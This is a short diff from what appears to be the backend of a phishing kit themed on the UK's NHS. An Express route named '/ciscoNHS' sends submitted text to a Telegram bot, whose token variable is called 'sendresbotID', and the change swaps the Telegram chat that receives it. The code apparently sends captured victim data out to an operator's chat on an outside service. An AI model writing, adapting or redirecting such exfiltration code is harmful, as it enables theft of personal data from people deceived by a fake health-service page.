@@ -11371,7 +11371,7 @@ app.post("/ciscoNHS", (req, res) => {
           .post(
             `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
             {
-              chat_id: 2017501535,
+              chat_id: 1911692807,
               text: `NHS:\n${originalText}`,
               parse_mode: "Markdown",
             }
